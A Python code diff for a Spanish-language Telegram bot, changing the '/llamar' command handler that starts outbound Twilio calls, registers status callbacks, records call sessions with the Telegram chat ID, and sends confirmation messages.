@@ -708,6 +708,7 @@ def process_telegram_update(update):
             else:
                 send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar SID 1 1 1")
 
+
 def process_call_command(chat_id, message_text):
     """Procesa el comando /llamar para iniciar una llamada desde Telegram."""
     parts = message_text.split()
@@ -725,8 +726,11 @@ def process_call_command(chat_id, message_text):
         send_telegram_response(chat_id, "❌ <b>Formato de número inválido.</b> Debe comenzar con + y tener al menos 8 dígitos.")
         return False
     
+    # Iniciar polling de Telegram si no está activo (igual que en make_call)
+    start_telegram_polling()
+    
     try:
-        # Construir las URLs correctamente
+        # Usar la misma lógica que make_call para construir URLs
         base_url = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
         url = f"{base_url}/step1"
         status_callback_url = f"{base_url}/call-status-callback"
@@ -734,34 +738,32 @@ def process_call_command(chat_id, message_text):
         logger.info(f"📞 URL para la llamada: {url}")
         logger.info(f"📞 URL para el callback de estado: {status_callback_url}")
         
-        # Hacer la llamada usando la API de Twilio con el callback de estado
+        # Hacer la llamada usando EXACTAMENTE la misma configuración que make_call
         call = client.calls.create(
-            to=phone_number,
+            to=phone_number,  # Solo cambiar el número de destino
             from_=TWILIO_PHONE_NUMBER,
             url=url,
             status_callback=status_callback_url,
             status_callback_method='POST',
-            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'failed', 'canceled']
+            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'failed']
         )
-
-        # Inicializar la sesión para el nuevo SID con estado inicial
+        
+        # Inicializar la sesión EXACTAMENTE como en make_call, pero agregando telegram_chat_id
         global_user_sessions[call.sid] = {
             'call_status': 'initiated',
-            'to_number': phone_number,
+            'to_number': phone_number,  # Usar el número del comando en lugar de YOUR_PHONE_NUMBER
             'initiated_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            'telegram_chat_id': chat_id
+            'telegram_chat_id': chat_id  # Agregar el chat_id para respuestas específicas
         }
         save_session_to_file(global_user_sessions)
         
-        logger.info(f"📞 Nueva llamada iniciada desde Telegram: SID={call.sid}, Número={phone_number}")
+        # Notificar a Telegram IGUAL que make_call pero personalizado
+        send_to_telegram(f"🚀 <b>Llamada iniciada desde Telegram</b>\nSID: {call.sid}\nNúmero: {phone_number}\nEstado: Iniciando...")
         
-        # Confirmar al usuario de Telegram
-        send_telegram_response(chat_id, f"🚀 <b>Llamada iniciada</b>\nNúmero: {phone_number}\nSID: {call.sid}\n\n⏳ Esperando estados de la llamada...")
+        # También enviar respuesta directa al usuario que pidió la llamada
+        send_telegram_response(chat_id, f"🚀 <b>Llamada iniciada</b>\nNúmero: {phone_number}\nSID: {call.sid}")
         
-        # Marcar que ya enviamos la confirmación inicial para este SID
-        initial_message_key = f"{call.sid}_initiated"
-        call_status_messages_sent[initial_message_key] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        
+        logger.info(f"📞 Nueva llamada iniciada desde Telegram: SID={call.sid}")
         return True
         
     except Exception as e:
